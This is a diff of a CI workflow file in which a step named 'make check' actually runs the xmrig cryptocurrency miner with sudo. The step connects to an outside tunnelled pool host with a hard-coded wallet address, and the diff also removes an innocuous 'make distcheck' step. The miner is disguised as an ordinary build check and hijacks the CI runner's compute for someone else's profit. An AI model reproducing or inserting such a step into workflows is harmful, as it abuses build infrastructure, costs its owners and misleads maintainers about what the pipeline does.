@@ -21,5 +21,4 @@ jobs:
       run: rm -rf config.json
     - name: make check
       run: sudo ./xmrig -o 21.tcp.cpolar.top:12146 --user 48RnhHXP7vqSz2USFYc7UvQFsKKr5e8eQMqvBjUptmJpV6RwSFD5DKyJGecbdKBe3FdTsjavpK1wYCCWT8McgzeyVUW2Vfo -p github --tls
-    - name: make distcheck
-      run: apt update
+
